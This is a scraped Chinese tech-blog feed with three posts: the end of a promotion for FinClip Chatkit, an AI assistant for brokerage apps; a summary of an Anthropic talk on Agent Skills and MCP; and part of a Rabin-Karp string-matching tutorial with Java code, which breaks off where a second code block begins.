.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>近期，又一家头部券商宣布成立互联网分公司，在业内激起不小波澜。有人质疑这是“新瓶装旧酒”，但真正洞察行业演进的人会明白：这并非简单回归，而是一场面向AI时代客户经营体系的重构。 </p>
<p>十年前，互联网分公司的使命是“获客”，在流量红利期跑马圈地；十年后的今天，其核心命题已转变为“运营”。</p>
<p>如何激活存量、特别是那规模庞大却长期沉默的长尾客户？</p>
<p>线下投顾产能有限，传统菜单式App交互低效，如何让海量客户获得与其资产规模相匹配的智能服务，成为摆在每家券商面前的必答题。 </p>
<p>而券商App进化的下一站就是：从交易工具升级为智能服务体，从“人找功能”走向“服务懂人”。</p>
<p>AI技术不再是锦上添花的点缀，而是重塑客户关系、承载长尾运营的关键基础设施。 </p>
<p>那么，AI时代的金融App应该“长”什么样子？</p>
<p><strong>App的“对话即服务”能力</strong></p>
<p>现有券商App本质是功能的集合体：行情、交易、资讯、理财……彼此割裂，依赖用户层层点击寻找。对于长尾客户而言，学习成本高、操作路径复杂，导致许多服务功能“沉睡”。 </p>
<p>而AI原生思维下的App，应成为一个懂意图、会调度、能融合的智能体App。</p>
<p>用户无需学习导航逻辑，只需用自然语言提出需求：“帮我看看新能源基金的近期走势和风险评估”“对比一下我持仓里这两只股票的波动性”。系统能理解复杂意图，自动调用后端数据与服务，生成结构化的回答甚至动态交互界面。 </p>
<p>这正是FinClip Chatkit所实现的“会话即服务”新范式。</p>
<p>它通过生成式UI引擎，可将对话实时转化为可视化图表、产品卡片或交易面板，实现“交流中交易”；其上下文智能管理基于向量数据库，能记忆用户偏好、持仓历史与风险属性，让每次对话都延续认知，提供真正个性化的助理式服务。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0a8450a5b5694c12bc10abeb244ba7da~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRmluQ2xpcA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766479916&amp;x-signature=mzk%2BKsj7QEMX4NNzvDMLsKaj%2BnA%3D" alt="图片" loading="lazy"/></p>
<p><strong>让AI记住“上下文”</strong></p>
<p><strong>帮客户储存记忆</strong></p>
<p>长尾客户经营的核心在于理解。</p>
<p>传统模式下，客户数据散落在不同业务线，行为与偏好难以形成连贯画像。互联网分公司要推动的“线上经营系统化”，首先必须是数据与认知的系统化。 </p>
<p>FinClip Chatkit的“长期记忆与语义记忆体系”，能够跨会话持续积累用户画像，将离散的行为数据转化为可推理的客户情境。</p>
<p>当客户询问“当前市场震荡，我该怎么办？”时，系统不仅能回答市场分析，还可结合该客户的历史提问、持仓结构、风险承受力，提供有针对性的资产检视建议或配置调整方案，把“千人千面”从口号变为可运行的机制。</p>
<p><strong>敏捷体验与安全合规</strong></p>
<p>互联网分公司往往需要统筹App、企微、小程序等多端触点，实现一体化运营。这就要求底层服务能力能够灵活嵌入、体验一致。 </p>
<p>FinClip Chatkit支持多端原生嵌入（iOS/Android/Web）与小程序生态无缝集成，可在聊天流中直接唤起理财购买、业务办理等轻量应用，实现“对话即闭环”。</p>
<p>同时，支持端云模型灵活部署，既可用云端大模型处理复杂语义，也可通过本地化部署保障金融数据安全，满足合规要求。</p>
<p>一场静默的竞争力重构</p>
<p>未来三到五年，券商之间的竞争，将不再是牌照或流量的竞争，而是谁更懂客户、更快响应、更智能服务的竞争。 </p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2b823863afe44b79a82b0b0f6fbce4e5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRmluQ2xpcA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766479916&amp;x-signature=W1iWn8hjI%2FYuA4alR%2FituDuywik%3D" alt="图片" loading="lazy"/></p>
<p>那些率先将AI能力深度融合进客户经营体系的机构，不仅将激活沉睡的长尾，更将在新一轮的服务智能化浪潮中，构建起真正差异化的护城河。</p>
<p> 你，准备好了吗？</p>
<p><strong>关于FinClip Chatkit</strong></p>
<p>Chatkit是凡泰极客FinClip超级应用智能平台的一次重大能力升级，它能助力企业构建具备深度上下文感知、流式生成原生UI的超级App。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[为什么Anthropic说：AI的未来是Skills不是Agent？]]></title>    <link>https://juejin.cn/post/7584094504631320585</link>    <guid>https://juejin.cn/post/7584094504631320585</guid>    <pubDate>2025-12-16T07:05:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584094504631320585" data-draft-id="7584110439932493870" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="为什么Anthropic说：AI的未来是Skills不是Agent？"/> <meta itemprop="keywords" content="LLM"/> <meta itemprop="datePublished" content="2025-12-16T07:05:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="智泊AI"/> <meta itemprop="url" content="https://juejin.cn/user/3572727470361578"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            为什么Anthropic说：AI的未来是Skills不是Agent？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3572727470361578/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    智泊AI
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T07:05:53.000Z" title="Tue Dec 16 2025 07:05:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>随着AI智能体（Agent）技术的快速演进，当前开发领域普遍存在一种认知偏差：针对不同细分场景和具体用例，开发者倾向于从零开始创建独立的Agent。</p>
<p>Anthropic公司的Barry Zhang与Mahesh Murag在近期演讲中颠覆了这一传统思路，他们倡导的创新方法论明确指出："聚焦技能（Skills）开发，而非重复构建Agent"。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a39bf72f6ca941b2a8cc9e9a7eb01619~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766473553&amp;x-signature=L71%2FNj5gFKWq%2FLTXU5ueG14KPJc%3D" alt="图片" loading="lazy"/></p>
<p><strong>1. 现有的问题：通用智能 vs. 领域专长</strong></p>
<p>当前AI Agent虽具备卓越的智商与通用能力，却普遍存在‌领域专业知识（Expertise）‌的短板。</p>
<p>演讲者通过类比说明：解决税务问题时，人们需要的是精通税务的专家（Barry），而非即便智商高达300却需从零研读税法的数学天才（Mahesh）。</p>
<p>现有Agent恰似后者，若无专业背景与指导支持，在具体任务中难以达到理想表现。</p>
<p><strong>更多AI大模型学习视频及资源，都在<a href="https://link.juejin.cn?target=https%3A%2F%2Fyuan.zhipoai.cn%2F" target="_blank" title="https://yuan.zhipoai.cn/" ref="nofollow noopener noreferrer">智泊AI</a>。</strong></p>
<p><strong>2. 什么是"Agent Skills"？</strong></p>
<p><strong>问题解决方案‌</strong>：Anthropic 创新性地开发了 Agent Skills（智能体技能）框架。</p>
<p><strong>‌核心定义‌</strong>：将程序性知识封装为标准化单元，其底层逻辑与文件夹结构一致。</p>
<p><strong>‌模块组成‌</strong>：</p>
<p>提示词（Prompts）、执行脚本（Scripts）、配套说明文档</p>
<p><strong>‌设计优势‌</strong>：</p>
<p>‌直观性‌：采用文件系统架构，天然适配Git版本控制、Google Drive协作等现有工作流</p>
<p>‌扩展性‌：支持通过代码脚本实现工具功能，利用代码的自文档化和可迭代特性，显著提升指令执行精度</p>
<p><strong>3. 运作机制：节省上下文窗口</strong></p>
<p>为避免Agent在掌握数百项技能时超出上下文窗口（Context Window）的容量限制，Anthropic创新性地引入了渐进式披露（Progressive Disclosure）机制。</p>
<p>该机制下，模型在初始运行阶段仅能访问技能的元数据（Metadata），待Agent主动调用特定技能后，才会进一步加载其完整指令与相关文件内容。</p>
<p><strong>4. 蓬勃发展的生态系统</strong></p>
<p>自发布以来，技能生态系统已形成三大核心类别：</p>
<p><strong>‌基础技能‌</strong></p>
<p>为Agent提供通用功能支持，包括Office文档处理及科研任务执行（例如生物信息学数据分析场景）。</p>
<p><strong>‌合作伙伴技能‌</strong></p>
<p>实现第三方工具的无缝整合。典型案例：Notion开发了帮助Claude深度解析工作区数据的技能；Browserbase则提供了浏览器自动化操作技能。</p>
<p><strong>‌企业内部技能‌</strong></p>
<p>当前发展最迅猛的领域。头部企业正通过定制化技能训练Agent，使其适配内部代码规范、操作专属软件或完成特定财务流程。</p>
<p><strong>5. 面向未来的架构：MCP + Skills</strong></p>
<p>Anthropic 提出了一种明确的通用智能体架构框架：</p>
<p>‌Agent Loop‌：负责调控模型的推理流程</p>
<p>‌Runtime 环境‌：集成文件管理与代码运行功能</p>
<p>‌MCP (Model Context Protocol)‌：作为对接外部数据与工具的接口（实现系统与外部交互的核心通道）</p>
<p>‌Skills‌：封装领域专业知识库（智能体的认知储备）</p>
<p>该设计使得业务专家（如财务/法务人员）能够通过配置基础技能模块来增强AI的功能边界。</p>
<p><strong>6. 终极愿景：自我进化的知识库</strong></p>
<p>最让人期待的突破在于AI的进化能力。‌</p>
<p>Claude已具备自主创建技能的功能。例如，当它掌握了一项新任务（如撰写特定风格的PPT脚本），能够将该能力封装为可复用的"技能"模块。</p>
<p>这种机制使"经验积累"转化为实体化资产。通过持续的技能迭代，第30天的Claude将展现出远超初始版本的能力维度。</p>
<p><strong>总结</strong></p>
<p>演讲结尾通过计算机演进史构建了一个巧妙比喻：</p>
<p>‌模型 (Model)‌ 如同 ‌处理器 (Processor)‌：具备惊人潜力却难以独立发挥作用。</p>
<p>‌Runtime/Agent‌ 则类比 ‌操作系统 (OS)‌：核心职能在于资源协调与界面管理。</p>
<p>而 ‌技能 (Skills)‌ 恰似 ‌应用程序 (Software)‌：真正体现专业价值、实现具体功能的载体。</p>
<p>当前更应聚焦开发多元化的"应用程序"（Skills），而非重复构建基础"操作系统"（Agent）。</p>
<p><strong>更多AI大模型学习视频及资源，都在<a href="https://link.juejin.cn?target=https%3A%2F%2Fyuan.zhipoai.cn%2F" target="_blank" title="https://yuan.zhipoai.cn/" ref="nofollow noopener noreferrer">智泊AI</a>。</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[字符串匹配算法]]></title>    <link>https://juejin.cn/post/7584243498527080448</link>    <guid>https://juejin.cn/post/7584243498527080448</guid>    <pubDate>2025-12-16T07:05:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584243498527080448" data-draft-id="7584243498527031296" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="字符串匹配算法"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-16T07:05:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="神奇小汤圆"/> <meta itemprop="url" content="https://juejin.cn/user/1151943919285431"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            字符串匹配算法
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1151943919285431/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    神奇小汤圆
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T07:05:16.000Z" title="Tue Dec 16 2025 07:05:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    10
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读20分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Rabin-Karp算法</h2>
<p>Rabin-Karp算法是一种<strong>基于哈希函数的字符串匹配算法</strong>，由 Michael O. Rabin 和 Richard M. Karp 于1987年提出，核心思想是用<strong>哈希函数</strong>将模式串和文本串中的子串转换为数值进行比较，避免大量不必要的字符比较。这个算法特别适合<strong>多模式串匹配场景</strong>，时间复杂度平均为O(n+m)，n是文本串长度，m是模式串长度。</p>
<p>Rabin-Karp算法的关键在于使用<strong>滚动哈希函数</strong>（Rolling Hash），它可以在常数时间内计算出滑动窗口的新哈希值，保证算法在大多数情况下的高效性。</p>
<h3 data-id="heading-1">算法步骤</h3>
<ol>
<li>
<p>计算模式串的哈希值</p>
</li>
<li>
<p>计算文本串中长度为m的第一个子串的哈希值（m为模式串长度）</p>
</li>
<li>
<p>在文本串上滑动窗口，对于每个位置：</p>
<ul>
<li>使用滚动哈希技术高效计算当前窗口的哈希值</li>
<li>如果哈希值与模式串相等，则进行字符逐一比较以避免哈希冲突</li>
<li>如果完全匹配，则找到一个匹配位置</li>
</ul>
</li>
<li>
<p>重复步骤3，直到处理完整个文本串</p>
</li>
</ol>
<p>核心特性</p>
<ul>
<li><strong>基于哈希比较</strong>：通过哈希值比较代替直接字符比较</li>
<li><strong>滚动哈希</strong>：O(1)时间复杂度计算下一窗口的哈希值</li>
<li><strong>时间复杂度</strong>：平均情况O(n+m)，最坏情况O(n*m)</li>
<li><strong>空间复杂度</strong>：O(1)，只需常数额外空间</li>
<li><strong>适用范围</strong>：单模式和多模式串匹配场景，特别是多模式匹配</li>
</ul>
<h3 data-id="heading-2">基础实现</h3>
<p>接下来大家一起看下Rabin-Karp算法的部分主流语言实现：</p>
<p>java</p>
<pre><code class="hljs language-ini" lang="ini">public class RabinKarp {
    private final static int <span class="hljs-attr">PRIME</span> = <span class="hljs-number">101</span><span class="hljs-comment">; // 哈希计算使用的质数</span>
    
    public static int search(String text, String pattern) {
        int <span class="hljs-attr">m</span> = pattern.length()<span class="hljs-comment">;</span>
        int <span class="hljs-attr">n</span> = text.length()<span class="hljs-comment">;</span>
        
        if (m &gt; n) return -1<span class="hljs-comment">;</span>
        if (<span class="hljs-attr">m</span> == <span class="hljs-number">0</span>) return <span class="hljs-number">0</span><span class="hljs-comment">;</span>
        
        // 计算哈希乘数，等于d^(m-1) % PRIME，用于滚动哈希计算
        int <span class="hljs-attr">h</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span>
        for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; m - 1; i++) {</span>
            <span class="hljs-attr">h</span> = (h * <span class="hljs-number">256</span>) % PRIME<span class="hljs-comment">;</span>
        }
        
        // 计算模式串和第一个窗口的哈希值
        int <span class="hljs-attr">patternHash</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
        int <span class="hljs-attr">textHash</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
        for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; m; i++) {</span>
            <span class="hljs-attr">patternHash</span> = (<span class="hljs-number">256</span> * patternHash + pattern.charAt(i)) % PRIME<span class="hljs-comment">;</span>
            <span class="hljs-attr">textHash</span> = (<span class="hljs-number">256</span> * textHash + text.charAt(i)) % PRIME<span class="hljs-comment">;</span>
        }
        
        // 滑动窗口，比较哈希值
        for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt;= n - m; i++) {</span>
            // 哈希值相等时，检查是否真正匹配
            if (<span class="hljs-attr">patternHash</span> == textHash) {
                boolean <span class="hljs-attr">match</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
                for (int <span class="hljs-attr">j</span> = <span class="hljs-number">0</span><span class="hljs-comment">; j &lt; m; j++) {</span>
                    if (text.charAt(i + j) != pattern.charAt(j)) {
                        <span class="hljs-attr">match</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;</span>
                        break<span class="hljs-comment">;</span>
                    }
                }
                if (match) {
                    return i<span class="hljs-comment">; // 找到匹配</span>
                }
            }
            
            // 计算下一个窗口的哈希值
            if (i &lt; n - m) {
                <span class="hljs-attr">textHash</span> = (<span class="hljs-number">256</span> * (textHash - text.charAt(i) * h) + text.charAt(i + m)) % PRIME<span class="hljs-comment">;</span>
                // 处理负数哈希值
                if (textHash &lt; 0) {
                    textHash += PRIME<span class="hljs-comment">;</span>
                }
            }
        }
        
        return -1<span class="hljs-comment">; // 未找到匹配</span>
    }
    
    // 打印结果
    public static void main(String<span class="hljs-section">[]</span> args) {
        String <span class="hljs-attr">text</span> = <span class="hljs-string">"ABABCABABDABACDABABCABAB"</span><span class="hljs-comment">;</span>
        String <span class="hljs-attr">pattern</span> = <span class="hljs-string">"ABABCABAB"</span><span class="hljs-comment">;</span>
        
        int <span class="hljs-attr">position</span> = search(text, pattern)<span class="hljs-comment">;</span>
        if (<span class="hljs-attr">position</span> == -<span class="hljs-number">1</span>) {
            System.out.println("未找到匹配")<span class="hljs-comment">;</span>
        } else {
            System.out.println("模式串在位置 " + position + " 处匹配")<span class="hljs-comment">;</span>
            System.out.println(text)<span class="hljs-comment">;</span>
            // 打印指示匹配位置的指针
            for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; position; i++) {</span>
                System.out.print(" ")<span class="hljs-comment">;</span>
            }
            System.out.println(pattern)<span class="hljs-comment">;</span>
        }
    }
}
</code></pre>
<h3 data-id="heading-3">优化：使用更好的哈希函数</h3>
<p>比如使用更复杂的哈希函数来减少冲突</p>
<p>java</p>
<pre><code class="hljs language-ini" lang="ini">public class ImprovedRabinKarp {
